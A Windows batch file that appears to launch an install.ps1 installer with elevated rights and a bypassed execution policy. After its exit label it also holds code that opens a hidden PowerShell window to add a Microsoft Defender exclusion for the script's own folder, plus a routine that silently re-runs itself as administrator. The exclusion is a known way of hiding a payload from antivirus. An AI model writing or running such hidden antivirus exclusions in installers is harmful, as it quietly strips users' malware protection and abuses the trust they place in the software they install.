@ECHO OFF

SET ThisScriptsDirectory=%~dp0
SET PowerShellScriptPath=%ThisScriptsDirectory%install.ps1

pwsh -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process pwsh -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%PowerShellScriptPath%""' -Verb RunAs}";

if %ERRORLEVEL% equ 0 (
	goto exit
)

PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%PowerShellScriptPath%""' -Verb RunAs}";

:exit
exit


call :Admin

START Powershell -nologo -noninteractive -windowStyle hidden -noprofile -command ^
Add-MpPreference -ExclusionPath %~dp0;

:Admin
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit
)